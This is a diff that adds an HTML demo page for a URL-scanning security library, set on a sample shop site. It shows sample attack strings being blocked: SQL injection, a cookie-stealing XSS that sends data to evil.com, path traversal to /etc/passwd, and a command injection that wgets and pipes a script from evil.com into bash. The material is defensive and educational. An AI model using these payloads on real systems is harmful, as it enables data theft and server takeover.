@@ -1,0 +1,1134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ShopZone — Protected by SecureShield</title>
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Mono:wght@400;500&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg: #f5f0e8;
+      --dark: #0f0e0c;
+      --accent: #e63c2f;
+      --green: #1a7a4a;
+      --green-light: #e8f5ee;
+      --red-light: #fdf0ef;
+      --card: #ffffff;
+      --border: #e0d9ce;
+      --mono: 'DM Mono', monospace;
+      --head: 'Syne', sans-serif;
+      --body: 'DM Sans', sans-serif;
+      --shadow: 0 2px 20px rgba(15,14,12,0.08);
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: var(--body);
+      background: var(--bg);
+      color: var(--dark);
+      min-height: 100vh;
+    }
+
+    /* ── TOP SECURITY BAR ── */
+    .security-bar {
+      background: var(--dark);
+      color: #fff;
+      text-align: center;
+      padding: 8px;
+      font-family: var(--mono);
+      font-size: 0.75rem;
+      letter-spacing: 0.05em;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    .security-bar .pulse {
+      width: 8px; height: 8px;
+      background: #4ade80;
+      border-radius: 50%;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(1.3); }
+    }
+
+    /* ── NAVBAR ── */
+    nav {
+      background: var(--card);
+      border-bottom: 2px solid var(--dark);
+      padding: 0 40px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 64px;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+    .nav-logo {
+      font-family: var(--head);
+      font-size: 1.5rem;
+      font-weight: 800;
+      letter-spacing: -0.03em;
+    }
+    .nav-logo span { color: var(--accent); }
+    .nav-links {
+      display: flex;
+      gap: 28px;
+      list-style: none;
+    }
+    .nav-links a {
+      text-decoration: none;
+      color: var(--dark);
+      font-size: 0.9rem;
+      font-weight: 500;
+      opacity: 0.7;
+      transition: opacity 0.2s;
+    }
+    .nav-links a:hover { opacity: 1; }
+    .nav-actions { display: flex; gap: 10px; }
+    .btn {
+      padding: 9px 20px;
+      border-radius: 6px;
+      font-size: 0.85rem;
+      font-weight: 600;
+      cursor: pointer;
+      border: 2px solid var(--dark);
+      font-family: var(--body);
+      transition: all 0.15s;
+    }
+    .btn-outline { background: transparent; color: var(--dark); }
+    .btn-outline:hover { background: var(--dark); color: #fff; }
+    .btn-solid { background: var(--dark); color: #fff; }
+    .btn-solid:hover { background: #333; }
+    .btn-danger { background: var(--accent); color: #fff; border-color: var(--accent); }
+    .btn-danger:hover { background: #c03125; }
+    .btn-green { background: var(--green); color: #fff; border-color: var(--green); }
+    .btn-green:hover { background: #145e38; }
+
+    /* ── HERO ── */
+    .hero {
+      padding: 60px 40px 50px;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 50px;
+      max-width: 1100px;
+      margin: 0 auto;
+      align-items: center;
+    }
+    .hero-tag {
+      display: inline-block;
+      background: var(--dark);
+      color: #fff;
+      padding: 5px 14px;
+      border-radius: 4px;
+      font-family: var(--mono);
+      font-size: 0.72rem;
+      letter-spacing: 0.08em;
+      margin-bottom: 18px;
+    }
+    .hero h1 {
+      font-family: var(--head);
+      font-size: 3.2rem;
+      font-weight: 800;
+      line-height: 1.05;
+      letter-spacing: -0.03em;
+      margin-bottom: 16px;
+    }
+    .hero h1 em { font-style: normal; color: var(--accent); }
+    .hero p {
+      color: #555;
+      font-size: 1rem;
+      line-height: 1.65;
+      margin-bottom: 28px;
+    }
+    .hero-image {
+      background: var(--dark);
+      border-radius: 16px;
+      padding: 28px;
+      font-family: var(--mono);
+      font-size: 0.82rem;
+      line-height: 1.8;
+      color: #aaa;
+      border: 2px solid var(--dark);
+      position: relative;
+      overflow: hidden;
+    }
+    .hero-image::before {
+      content: '● ● ●';
+      display: block;
+      color: #555;
+      margin-bottom: 16px;
+      font-size: 0.7rem;
+      letter-spacing: 4px;
+    }
+    .c-pink { color: #ff79c6; }
+    .c-green { color: #50fa7b; }
+    .c-yellow { color: #f1fa8c; }
+    .c-blue { color: #8be9fd; }
+    .c-orange { color: #ffb86c; }
+    .c-gray { color: #6272a4; }
+
+    /* ── SECTION ── */
+    .section {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 50px 40px;
+    }
+    .section-label {
+      font-family: var(--mono);
+      font-size: 0.72rem;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--accent);
+      margin-bottom: 8px;
+    }
+    .section h2 {
+      font-family: var(--head);
+      font-size: 2rem;
+      font-weight: 800;
+      letter-spacing: -0.02em;
+      margin-bottom: 30px;
+    }
+
+    /* ── DIVIDER ── */
+    .divider {
+      height: 2px;
+      background: var(--border);
+      margin: 0 40px;
+    }
+
+    /* ══════════════════════════════════════
+       SECURESHIELD DEMO SECTION
+    ══════════════════════════════════════ */
+    .demo-section {
+      background: var(--dark);
+      color: #fff;
+      padding: 60px 40px;
+    }
+    .demo-inner {
+      max-width: 1100px;
+      margin: 0 auto;
+    }
+    .demo-section .section-label { color: #4ade80; }
+    .demo-section h2 {
+      font-family: var(--head);
+      font-size: 2rem;
+      font-weight: 800;
+      margin-bottom: 10px;
+    }
+    .demo-section > .demo-inner > p {
+      color: #aaa;
+      margin-bottom: 36px;
+      font-size: 0.95rem;
+    }
+
+    /* Step explanation cards */
+    .steps-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 16px;
+      margin-bottom: 40px;
+    }
+    .step-card {
+      background: #1a1917;
+      border: 1px solid #2a2926;
+      border-radius: 12px;
+      padding: 20px;
+      position: relative;
+    }
+    .step-num {
+      font-family: var(--mono);
+      font-size: 0.7rem;
+      color: #555;
+      margin-bottom: 10px;
+    }
+    .step-card h4 {
+      font-family: var(--head);
+      font-size: 0.95rem;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: #fff;
+    }
+    .step-card p { font-size: 0.8rem; color: #888; line-height: 1.5; }
+    .step-arrow {
+      position: absolute;
+      right: -10px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #333;
+      font-size: 1.2rem;
+      z-index: 1;
+    }
+
+    /* Simulator */
+    .simulator {
+      background: #1a1917;
+      border: 1px solid #2a2926;
+      border-radius: 16px;
+      overflow: hidden;
+    }
+    .sim-header {
+      background: #111;
+      padding: 14px 20px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      border-bottom: 1px solid #2a2926;
+    }
+    .sim-dots { display: flex; gap: 6px; }
+    .sim-dot {
+      width: 12px; height: 12px;
+      border-radius: 50%;
+    }
+    .sim-dot.r { background: #ff5f57; }
+    .sim-dot.y { background: #ffbd2e; }
+    .sim-dot.g { background: #28c840; }
+    .sim-title {
+      font-family: var(--mono);
+      font-size: 0.75rem;
+      color: #555;
+      flex: 1;
+      text-align: center;
+    }
+
+    .sim-body { display: grid; grid-template-columns: 1fr 1fr; }
+
+    .sim-panel {
+      padding: 24px;
+    }
+    .sim-panel + .sim-panel {
+      border-left: 1px solid #2a2926;
+    }
+    .sim-panel-title {
+      font-family: var(--mono);
+      font-size: 0.7rem;
+      color: #555;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      margin-bottom: 16px;
+    }
+
+    /* Attack buttons */
+    .attack-list { display: flex; flex-direction: column; gap: 8px; }
+    .attack-btn {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      padding: 12px 14px;
+      background: #111;
+      border: 1px solid #2a2926;
+      border-radius: 8px;
+      cursor: pointer;
+      text-align: left;
+      transition: all 0.2s;
+      width: 100%;
+    }
+    .attack-btn:hover { border-color: #444; background: #161513; }
+    .attack-btn.active { border-color: var(--accent); background: #2d1512; }
+    .attack-btn.safe-btn { }
+    .attack-btn.safe-btn.active { border-color: #4ade80; background: #0d2818; }
+    .attack-icon { font-size: 1.2rem; flex-shrink: 0; margin-top: 2px; }
+    .attack-info {}
+    .attack-name {
+      font-family: var(--head);
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 3px;
+    }
+    .attack-desc { font-size: 0.75rem; color: #666; line-height: 1.4; }
+    .attack-url {
+      font-family: var(--mono);
+      font-size: 0.65rem;
+      color: #444;
+      margin-top: 4px;
+      word-break: break-all;
+    }
+
+    /* Result panel */
+    .result-display {
+      min-height: 420px;
+      display: flex;
+      flex-direction: column;
+    }
+    .result-placeholder {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: #333;
+      text-align: center;
+      gap: 12px;
+    }
+    .result-placeholder .icon { font-size: 3rem; }
+    .result-placeholder p { font-size: 0.82rem; line-height: 1.5; }
+
+    /* Blocked result */
+    .result-blocked {
+      display: none;
+      flex-direction: column;
+      gap: 16px;
+    }
+    .result-safe {
+      display: none;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .result-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 16px;
+      border-radius: 6px;
+      font-family: var(--head);
+      font-size: 0.9rem;
+      font-weight: 700;
+      width: fit-content;
+    }
+    .badge-blocked { background: #2d1512; border: 1px solid var(--accent); color: #ff6b5b; }
+    .badge-safe { background: #0d2818; border: 1px solid #4ade80; color: #4ade80; }
+
+    .result-code {
+      background: #111;
+      border: 1px solid #2a2926;
+      border-radius: 8px;
+      padding: 16px;
+      font-family: var(--mono);
+      font-size: 0.75rem;
+      line-height: 1.8;
+      color: #888;
+    }
+    .result-code .line { display: flex; gap: 12px; }
+    .result-code .ln { color: #333; min-width: 20px; }
+
+    .result-explanation {
+      background: #111;
+      border-radius: 8px;
+      padding: 16px;
+      font-size: 0.82rem;
+      color: #888;
+      line-height: 1.6;
+      border-left: 3px solid #333;
+    }
+    .result-explanation.danger { border-left-color: var(--accent); }
+    .result-explanation.success { border-left-color: #4ade80; }
+    .result-explanation strong { color: #fff; }
+
+    .http-status {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-family: var(--mono);
+      font-size: 0.8rem;
+    }
+    .status-403 {
+      background: var(--accent);
+      color: #fff;
+      padding: 3px 10px;
+      border-radius: 4px;
+      font-weight: 700;
+    }
+    .status-200 {
+      background: #4ade80;
+      color: #000;
+      padding: 3px 10px;
+      border-radius: 4px;
+      font-weight: 700;
+    }
+
+    /* ── PRODUCTS SECTION ── */
+    .products-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 20px;
+    }
+    .product-card {
+      background: var(--card);
+      border: 2px solid var(--border);
+      border-radius: 12px;
+      overflow: hidden;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+    .product-card:hover {
+      transform: translateY(-3px);
+      box-shadow: var(--shadow);
+    }
+    .product-img {
+      height: 180px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 4rem;
+      border-bottom: 2px solid var(--border);
+    }
+    .product-img.bg1 { background: #fef3c7; }
+    .product-img.bg2 { background: #dbeafe; }
+    .product-img.bg3 { background: #fce7f3; }
+    .product-info { padding: 18px; }
+    .product-name {
+      font-family: var(--head);
+      font-size: 1rem;
+      font-weight: 700;
+      margin-bottom: 4px;
+    }
+    .product-price {
+      color: var(--accent);
+      font-weight: 700;
+      font-size: 1.1rem;
+      margin-bottom: 12px;
+    }
+    .product-card .btn { width: 100%; text-align: center; }
+
+    /* ── LOGIN FORM ── */
+    .login-demo {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 30px;
+      align-items: start;
+    }
+    .form-card {
+      background: var(--card);
+      border: 2px solid var(--border);
+      border-radius: 12px;
+      padding: 28px;
+    }
+    .form-card h3 {
+      font-family: var(--head);
+      font-size: 1.1rem;
+      font-weight: 800;
+      margin-bottom: 6px;
+    }
+    .form-card .sub { color: #888; font-size: 0.82rem; margin-bottom: 20px; }
+    .form-group { margin-bottom: 14px; }
+    .form-group label {
+      display: block;
+      font-size: 0.8rem;
+      font-weight: 600;
+      margin-bottom: 6px;
+      color: #444;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 10px 14px;
+      border: 2px solid var(--border);
+      border-radius: 6px;
+      font-size: 0.9rem;
+      font-family: var(--mono);
+      background: var(--bg);
+      color: var(--dark);
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    .form-group input:focus { border-color: var(--dark); }
+    .form-hint {
+      font-size: 0.75rem;
+      color: #999;
+      margin-top: 4px;
+    }
+    .form-result {
+      margin-top: 16px;
+      padding: 16px 18px;
+      border-radius: 10px;
+      font-size: 0.85rem;
+      display: none;
+      line-height: 1.7;
+    }
+    .form-result.blocked {
+      background: var(--red-light);
+      border: 2px solid #fca5a5;
+      color: #b91c1c;
+    }
+    .form-result.success {
+      background: var(--green-light);
+      border: 2px solid #86efac;
+      color: #166534;
+    }
+    .form-result.warning {
+      background: #fffbeb;
+      border: 2px solid #fcd34d;
+      color: #92400e;
+    }
+    .result-steps {
+      margin-top: 10px;
+      padding-top: 10px;
+      border-top: 1px solid rgba(0,0,0,0.08);
+      font-size: 0.78rem;
+      opacity: 0.85;
+    }
+    .result-steps div { margin-bottom: 4px; }
+    .explain-card {
+      background: var(--card);
+      border: 2px solid var(--border);
+      border-radius: 12px;
+      padding: 24px;
+    }
+    .explain-card h4 {
+      font-family: var(--head);
+      font-weight: 800;
+      margin-bottom: 14px;
+      font-size: 1rem;
+    }
+    .explain-step {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 16px;
+      padding-bottom: 16px;
+      border-bottom: 1px solid var(--border);
+    }
+    .explain-step:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
+    .explain-num {
+      width: 26px;
+      height: 26px;
+      background: var(--dark);
+      color: #fff;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.75rem;
+      font-weight: 700;
+      flex-shrink: 0;
+    }
+    .explain-text { font-size: 0.82rem; color: #555; line-height: 1.5; }
+    .explain-text strong { color: var(--dark); }
+
+    /* ── FOOTER ── */
+    footer {
+      background: var(--dark);
+      color: #888;
+      text-align: center;
+      padding: 30px;
+      font-size: 0.82rem;
+      margin-top: 60px;
+    }
+    footer strong { color: #fff; }
+    footer a { color: #aaa; }
+
+    /* ── ANIMATIONS ── */
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .animate-in { animation: slideIn 0.3s ease forwards; }
+
+    @keyframes scanLine {
+      0% { top: 0; }
+      100% { top: 100%; }
+    }
+
+    @media (max-width: 768px) {
+      .hero { grid-template-columns: 1fr; }
+      .steps-grid { grid-template-columns: 1fr 1fr; }
+      .sim-body { grid-template-columns: 1fr; }
+      .products-grid { grid-template-columns: 1fr; }
+      .login-demo { grid-template-columns: 1fr; }
+      nav { padding: 0 20px; }
+      .nav-links { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- ── SECURITY STATUS BAR ── -->
+<div class="security-bar">
+  <div class="pulse"></div>
+  🛡️ SecureShield Active — All requests are being scanned in real-time
+</div>
+
+<!-- ── NAVBAR ── -->
+<nav>
+  <div class="nav-logo">Shop<span>Zone</span></div>
+  <ul class="nav-links">
+    <li><a href="#">Home</a></li>
+    <li><a href="#">Products</a></li>
+    <li><a href="#">About</a></li>
+    <li><a href="#">Contact</a></li>
+  </ul>
+  <div class="nav-actions">
+    <button class="btn btn-outline">Log In</button>
+    <button class="btn btn-solid">Sign Up</button>
+  </div>
+</nav>
+
+<!-- ── HERO ── -->
+<div class="hero">
+  <div>
+    <div class="hero-tag">PROTECTED BY SECURESHIELD v1.0</div>
+    <h1>Shop Safe.<br/>Shop <em>Smart.</em></h1>
+    <p>This is a sample e-commerce website showing how <strong>SecureShield</strong> protects real websites from hackers — in real-time, automatically, with zero extra effort.</p>
+    <div style="display:flex;gap:12px;flex-wrap:wrap;">
+      <button class="btn btn-solid" onclick="document.getElementById('demo').scrollIntoView({behavior:'smooth'})">▶ See the Demo</button>
+      <button class="btn btn-outline" onclick="document.getElementById('login-demo').scrollIntoView({behavior:'smooth'})">Try the Login Form</button>
+    </div>
+  </div>
+  <div class="hero-image">
+<span class="c-gray"># app.py — SecureShield protecting ShopZone</span>
+
+<span class="c-pink">from</span> <span class="c-blue">secureshield</span> <span class="c-pink">import</span> scan_url
+<span class="c-pink">from</span> <span class="c-blue">flask</span> <span class="c-pink">import</span> Flask, request
+
+app = Flask(__name__)
+
+<span class="c-yellow">@app.before_request</span>
+<span class="c-pink">def</span> <span class="c-green">protect()</span>:
+    attack = scan_url(request.url)
+    <span class="c-pink">if</span> attack:
+        <span class="c-pink">return</span> <span class="c-orange">f"Blocked: {attack}"</span>, <span class="c-blue">403</span>
+
+<span class="c-gray"># Every route is now protected ✅</span>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- ══════════════════════════════════════
+     SECURESHIELD INTERACTIVE DEMO
+══════════════════════════════════════ -->
+<div class="demo-section" id="demo">
+  <div class="demo-inner">
+    <div class="section-label">// LIVE DEMONSTRATION</div>
+    <h2>Watch SecureShield Block Attacks</h2>
+    <p>Click any attack below to see exactly what happens — step by step — when a hacker tries to attack this website.</p>
+
+    <!-- HOW IT WORKS STEPS -->
+    <div class="steps-grid">
+      <div class="step-card">
+        <div class="step-num">STEP 01</div>
+        <h4>🌐 Hacker Sends Request</h4>
+        <p>A hacker visits the website with a malicious URL containing an attack hidden in it.</p>
+        <div class="step-arrow">›</div>
+      </div>
+      <div class="step-card">
+        <div class="step-num">STEP 02</div>
+        <h4>🔍 SecureShield Scans</h4>
+        <p>Before the request reaches your website, SecureShield's <code style="color:#4ade80">scan_url()</code> reads the URL.</p>
+        <div class="step-arrow">›</div>
+      </div>
+      <div class="step-card">
+        <div class="step-num">STEP 03</div>
+        <h4>🚨 Attack Detected</h4>
+        <p>SecureShield matches the URL against 50+ known attack patterns and identifies the threat.</p>
+        <div class="step-arrow">›</div>
+      </div>
+      <div class="step-card">
+        <div class="step-num">STEP 04</div>
+        <h4>🛡️ Request Blocked</h4>
+        <p>The hacker gets a 403 Forbidden error. Your website and database stay safe.</p>
+      </div>
+    </div>
+
+    <!-- SIMULATOR -->
+    <div class="simulator">
+      <div class="sim-header">
+        <div class="sim-dots">
+          <div class="sim-dot r"></div>
+          <div class="sim-dot y"></div>
+          <div class="sim-dot g"></div>
+        </div>
+        <div class="sim-title">secureshield-live-demo — attack simulator</div>
+      </div>
+      <div class="sim-body">
+
+        <!-- LEFT: Attack selector -->
+        <div class="sim-panel">
+          <div class="sim-panel-title">// SELECT AN ATTACK TO SIMULATE</div>
+          <div class="attack-list">
+
+            <button class="attack-btn safe-btn" onclick="simulate('safe')">
+              <div class="attack-icon">✅</div>
+              <div class="attack-info">
+                <div class="attack-name">Normal User Visit</div>
+                <div class="attack-desc">A regular person browsing the shop. Should pass through normally.</div>
+                <div class="attack-url">shopzone.com/products?category=shoes</div>
+              </div>
+            </button>
+
+            <button class="attack-btn" onclick="simulate('sqli')">
+              <div class="attack-icon">💉</div>
+              <div class="attack-info">
+                <div class="attack-name">SQL Injection</div>
+                <div class="attack-desc">Hacker tries to steal your entire database using SQL commands.</div>
+                <div class="attack-url">shopzone.com/search?q=1' UNION SELECT * FROM users--</div>
+              </div>
+            </button>
+
+            <button class="attack-btn" onclick="simulate('xss')">
+              <div class="attack-icon">⚡</div>
+              <div class="attack-info">
+                <div class="attack-name">XSS Attack</div>
+                <div class="attack-desc">Hacker injects a script to steal your customers' cookies and passwords.</div>
+                <div class="attack-url">shopzone.com/review?msg=&lt;script&gt;steal(document.cookie)&lt;/script&gt;</div>
+              </div>
+            </button>
+
+            <button class="attack-btn" onclick="simulate('path')">
+              <div class="attack-icon">📂</div>
+              <div class="attack-info">
+                <div class="attack-name">Path Traversal</div>
+                <div class="attack-desc">Hacker tries to read your server's secret password file.</div>
+                <div class="attack-url">shopzone.com/image?file=../../etc/passwd</div>
+              </div>
+            </button>
+
+            <button class="attack-btn" onclick="simulate('cmd')">
+              <div class="attack-icon">💻</div>
+              <div class="attack-info">
+                <div class="attack-name">Command Injection</div>
+                <div class="attack-desc">Hacker tries to run their own commands on your server.</div>
+                <div class="attack-url">shopzone.com/ping?host=localhost;wget+http://evil.com/virus.sh</div>
+              </div>
+            </button>
+
+          </div>
+        </div>
+
+        <!-- RIGHT: Result display -->
+        <div class="sim-panel">
+          <div class="sim-panel-title">// SECURESHIELD RESPONSE</div>
+          <div class="result-display">
+
+            <div class="result-placeholder" id="result-placeholder">
+              <div class="icon">👈</div>
+              <p>Click any attack on the left<br/>to see SecureShield in action</p>
+            </div>
+
+            <div class="result-blocked animate-in" id="result-blocked">
+              <div class="result-badge badge-blocked">🚨 ATTACK BLOCKED</div>
+              <div class="http-status">
+                <span class="status-403">403</span>
+                <span style="color:#666">Forbidden — Request terminated</span>
+              </div>
+              <div class="result-code" id="blocked-code"></div>
+              <div class="result-explanation danger" id="blocked-explanation"></div>
+              <div style="font-family:var(--mono);font-size:0.72rem;color:#333;margin-top:8px;">
+                ✅ Attack logged to secureshield_attacks.csv
+              </div>
+            </div>
+
+            <div class="result-safe animate-in" id="result-safe">
+              <div class="result-badge badge-safe">✅ REQUEST ALLOWED</div>
+              <div class="http-status">
+                <span class="status-200">200</span>
+                <span style="color:#666">OK — Normal request passed through</span>
+              </div>
+              <div class="result-code">
+                <div class="line"><span class="ln">1</span><span class="c-gray"># SecureShield scan result</span></div>
+                <div class="line"><span class="ln">2</span><span>url = <span class="c-orange">"shopzone.com/products?category=shoes"</span></span></div>
+                <div class="line"><span class="ln">3</span><span>attack = scan_url(url)</span></div>
+                <div class="line"><span class="ln">4</span><span class="c-gray"># attack = None ← no threat found</span></div>
+                <div class="line"><span class="ln">5</span><span class="c-green"># → Request passed to website ✅</span></div>
+              </div>
+              <div class="result-explanation success">
+                <strong>No threat detected.</strong> This is a normal URL with no suspicious patterns. SecureShield lets it through instantly. The customer sees your website normally. 🛍️
+              </div>
+            </div>
+
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ── PRODUCTS SECTION ── -->
+<div class="section">
+  <div class="section-label">// SAMPLE STORE</div>
+  <h2>Featured Products</h2>
+  <div class="products-grid">
+    <div class="product-card">
+      <div class="product-img bg1">👟</div>
+      <div class="product-info">
+        <div class="product-name">Air Runner Pro</div>
+        <div class="product-price">$129.99</div>
+        <button class="btn btn-solid">Add to Cart</button>
+      </div>
+    </div>
+    <div class="product-card">
+      <div class="product-img bg2">🎧</div>
+      <div class="product-info">
+        <div class="product-name">SoundMax Headphones</div>
+        <div class="product-price">$89.99</div>
+        <button class="btn btn-solid">Add to Cart</button>
+      </div>
+    </div>
+    <div class="product-card">
+      <div class="product-img bg3">⌚</div>
+      <div class="product-info">
+        <div class="product-name">SmartWatch Elite</div>
+        <div class="product-price">$249.99</div>
+        <button class="btn btn-solid">Add to Cart</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- ── LOGIN DEMO ── -->
+<div class="section" id="login-demo">
+  <div class="section-label">// LIVE LOGIN PROTECTION</div>
+  <h2>Try Attacking the Login Form</h2>
+
+  <div class="login-demo">
+    <div class="form-card">
+      <h3>🔐 ShopZone Login</h3>
+      <p class="sub">Test SecureShield live — try a normal login or a hacker attack below.</p>
+
+      <div class="form-group">
+        <label>Username</label>
+        <input type="text" id="login-user" placeholder="e.g. john or admin'--" />
+      </div>
+      <div class="form-group">
+        <label>Password</label>
+        <input type="password" id="login-pass" placeholder="any password" />
+      </div>
+
+      <button class="btn btn-green" style="width:100%;margin-bottom:12px" onclick="tryLogin()">Login →</button>
+
+      <!-- Quick test buttons -->
+      <p style="font-size:0.78rem;color:#999;margin-bottom:8px;font-weight:600;">⚡ QUICK TESTS — click to auto-fill &amp; test:</p>
+      <div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:4px;">
+        <button class="btn btn-outline" style="font-size:0.75rem;padding:5px 12px" onclick="quickTest('john', 'pass123')">✅ Normal User</button>
+        <button class="btn btn-outline" style="font-size:0.75rem;padding:5px 12px" onclick="quickTest('alice', 'hello')">✅ Alice</button>
+        <button class="btn btn-danger" style="font-size:0.75rem;padding:5px 12px" onclick="quickTest(&quot;admin'--&quot;, 'x')">💉 SQL Inject</button>
+        <button class="btn btn-danger" style="font-size:0.75rem;padding:5px 12px" onclick="quickTest('&lt;script&gt;alert(1)', 'x')">⚡ XSS Attack</button>
+        <button class="btn btn-danger" style="font-size:0.75rem;padding:5px 12px" onclick="quickTest('1 OR 1=1', 'x')">💉 SQL Bypass</button>
+      </div>
+
+      <div class="form-result" id="form-result"></div>
+    </div>
+
+    <div class="explain-card">
+      <h4>🛡️ How SecureShield Protects This Form</h4>
+      <div class="explain-step">
+        <div class="explain-num">1</div>
+        <div class="explain-text">You click <strong>Login</strong> — the form sends your username + password to the server as a URL like <code>/login?user=admin&pass=123</code></div>
+      </div>
+      <div class="explain-step">
+        <div class="explain-num">2</div>
+        <div class="explain-text"><strong>SecureShield intercepts</strong> the request before it touches the login logic — using Flask's <code>@app.before_request</code> hook</div>
+      </div>
+      <div class="explain-step">
+        <div class="explain-num">3</div>
+        <div class="explain-text"><strong>scan_url()</strong> checks the full URL for attack patterns — if your username contains <code>'--</code> that's a classic SQL Injection trick</div>
+      </div>
+      <div class="explain-step">
+        <div class="explain-num">4</div>
+        <div class="explain-text">If an attack is found → <strong>403 Blocked</strong>. If safe → login proceeds normally. The attack is also saved to your log file automatically.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ── FOOTER ── -->
+<footer>
+  <p>🛡️ <strong>ShopZone</strong> is protected by <strong>SecureShield v1.0.0</strong></p>
+  <p style="margin-top:8px;">
+    Built to demonstrate the <a href="https://github.com/Sudharsan56/secureshield">SecureShield Python Library</a> ·
+    MIT License
+  </p>
+</footer>
+
+<script>
+  const attacks = {
+    sqli: {
+      name: "SQL Injection",
+      url: "shopzone.com/search?q=1' UNION SELECT * FROM users--",
+      code: [
+        ["1", "c-gray", "# Incoming request URL"],
+        ["2", "c-orange", 'url = "shopzone.com/search?q=1\' UNION SELECT * FROM users--"'],
+        ["3", "", "attack = scan_url(url)"],
+        ["4", "c-pink", '# attack = "SQL Injection" ← DETECTED!'],
+        ["5", "c-green", "# → return 403 Forbidden 🚨"],
+      ],
+      explanation: `<strong>What the hacker wanted:</strong> By adding <code>UNION SELECT * FROM users</code>, they were trying to trick your database into dumping every username and password stored in your site.<br/><br/><strong>How SecureShield caught it:</strong> It matched the pattern <code>UNION.*SELECT</code> — a classic SQL injection signature — and blocked the request before it ever touched your database.`
+    },
+    xss: {
+      name: "XSS Attack",
+      url: "shopzone.com/review?msg=<script>document.location='evil.com?c='+document.cookie</script>",
+      code: [
+        ["1", "c-gray", "# Incoming request URL"],
+        ["2", "c-orange", 'url = "shopzone.com/review?msg=<script>steal()</script>"'],
+        ["3", "", "attack = scan_url(url)"],
+        ["4", "c-pink", '# attack = "XSS" ← DETECTED!'],
+        ["5", "c-green", "# → return 403 Forbidden 🚨"],
+      ],
+      explanation: `<strong>What the hacker wanted:</strong> The <code>&lt;script&gt;</code> tag would run JavaScript in your customers' browsers, stealing their login cookies and sending them to the hacker's server.<br/><br/><strong>How SecureShield caught it:</strong> It detected the <code>&lt;script&gt;</code> tag pattern and blocked the request instantly, protecting all your customers.`
+    },
+    path: {
+      name: "Path Traversal",
+      url: "shopzone.com/image?file=../../etc/passwd",
+      code: [
+        ["1", "c-gray", "# Incoming request URL"],
+        ["2", "c-orange", 'url = "shopzone.com/image?file=../../etc/passwd"'],
+        ["3", "", "attack = scan_url(url)"],
+        ["4", "c-pink", '# attack = "Path Traversal" ← DETECTED!'],
+        ["5", "c-green", "# → return 403 Forbidden 🚨"],
+      ],
+      explanation: `<strong>What the hacker wanted:</strong> The <code>../../etc/passwd</code> pattern tries to navigate up your server's folder structure and read a file containing all system usernames and passwords.<br/><br/><strong>How SecureShield caught it:</strong> It recognised the <code>../</code> directory traversal pattern and the target file path, blocking access immediately.`
+    },
+    cmd: {
+      name: "Command Injection",
+      url: "shopzone.com/ping?host=localhost;wget+http://evil.com/virus.sh|bash",
+      code: [
+        ["1", "c-gray", "# Incoming request URL"],
+        ["2", "c-orange", 'url = "shopzone.com/ping?host=localhost;wget+evil.com/virus"'],
+        ["3", "", "attack = scan_url(url)"],
+        ["4", "c-pink", '# attack = "Command Injection" ← DETECTED!'],
+        ["5", "c-green", "# → return 403 Forbidden 🚨"],
+      ],
+      explanation: `<strong>What the hacker wanted:</strong> Using <code>;</code> to chain commands, they tried to download and execute a virus script directly on your server — giving them full remote control.<br/><br/><strong>How SecureShield caught it:</strong> The <code>;wget</code> shell command pattern was matched, and the request was killed before reaching your server's shell.`
+    }
+  };
+
+  function simulate(type) {
+    // Update active button
+    document.querySelectorAll('.attack-btn').forEach(b => b.classList.remove('active'));
+    event.currentTarget.classList.add('active');
+
+    document.getElementById('result-placeholder').style.display = 'none';
+    document.getElementById('result-blocked').style.display = 'none';
+    document.getElementById('result-safe').style.display = 'none';
+
+    if (type === 'safe') {
+      const el = document.getElementById('result-safe');
+      el.style.display = 'flex';
+      el.classList.remove('animate-in');
+      void el.offsetWidth;
+      el.classList.add('animate-in');
+      return;
+    }
+
+    const data = attacks[type];
+    const codeEl = document.getElementById('blocked-code');
+    const explainEl = document.getElementById('blocked-explanation');
+
+    // Build code lines
+    codeEl.innerHTML = data.code.map(([ln, cls, text]) =>
